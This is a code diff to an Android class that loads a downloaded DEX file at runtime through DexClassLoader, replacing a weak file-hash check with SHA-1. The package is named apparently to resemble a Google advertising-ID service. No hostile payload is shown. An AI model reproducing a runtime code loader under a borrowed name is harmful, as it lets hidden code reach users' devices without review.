@@ -1,16 +1,22 @@
 package com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader;
 
 import android.content.Context;
+import android.util.Log;
 
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
 import com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer.SharedPreferencesServicer;
 
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
+import java.security.DigestInputStream;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 
 import dalvik.system.DexClassLoader;
 
@@ -19,7 +25,7 @@ public class ExternalLibServicer {
     private static ExternalLibServicer instance = null;
 
     private ExternalLibServicer(Context cnt){
-        String filePath = getDexFilePath(cnt); //!!! TODO: возможно надо сохранять отдельно как релизную так и дебажную версию
+        String filePath = getDexFilePath(cnt);
         File dexFile = new File(filePath);
         if( dexFile.length() == 0){ // Если самого файла нет - ничего не загружаем
             dexClassLoader = null;
@@ -29,8 +35,18 @@ public class ExternalLibServicer {
         String dexHashCode = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_DEX_HASH, GlobalParameters.SPF_KEY_DEX_HASH, null);
 
         //Проверяем что наш DEX не подменили и он имеет тот же хэш-код что и при скачивании
-        String realDexHash = String.valueOf(dexFile.hashCode());
-        Logger.log("dex_code = " + dexFile.hashCode());
+        //String realDexHash = String.valueOf(dexFile.hashCode());
+        String realDexHash = null;
+        try {
+            realDexHash = sha1Code(filePath);
+        } catch (IOException e) {
+            Logger.log(e.getMessage());
+        } catch (NoSuchAlgorithmException e) {
+            Logger.log(e.getMessage());
+        }
+
+        Logger.log("dex_code = " + dexHashCode);
+        Logger.log("dex_f_code = " + realDexHash + " size: " + dexFile.length());
         if((dexHashCode!= null)&&(dexHashCode.equals(realDexHash))) {
             File codeCacheDir = new File(cnt.getCacheDir() + File.separator + "codeCache");
             codeCacheDir.mkdirs();
@@ -38,10 +54,9 @@ public class ExternalLibServicer {
         }
         else
         {
-            Logger.log("Ошибка загрузки dex файла. Не совпадают hash суммы  " + dexHashCode + "!=" + realDexHash);
+            Logger.log("Ошибка загрузки dex файла. Не совпадают hash суммы.");
             dexClassLoader = null;
         }
-
     }
 
     public static synchronized ExternalLibServicer getServicer(Context cnt)
@@ -54,6 +69,28 @@ public class ExternalLibServicer {
             }
         }
         return instance;
+    }
+    public String sha1Code(String filePath) throws IOException, NoSuchAlgorithmException {
+        FileInputStream fileInputStream = new FileInputStream(filePath);
+        MessageDigest digest = MessageDigest.getInstance("SHA-1");
+        DigestInputStream digestInputStream = new DigestInputStream(fileInputStream, digest);
+        byte[] bytes = new byte[1024];
+        while (digestInputStream.read(bytes) > 0);
+
+        byte[] resultByteArry = digest.digest();
+        return bytesToHexString(resultByteArry);
+    }
+
+    public static String bytesToHexString(byte[] bytes) {
+        StringBuilder sb = new StringBuilder();
+        for (byte b : bytes) {
+            int value = b & 0xFF;
+            if (value < 16) {
+                sb.append("0");
+            }
+            sb.append(Integer.toHexString(value).toUpperCase());
+        }
+        return sb.toString();
     }
 
     public static void clearDexClassLoader()
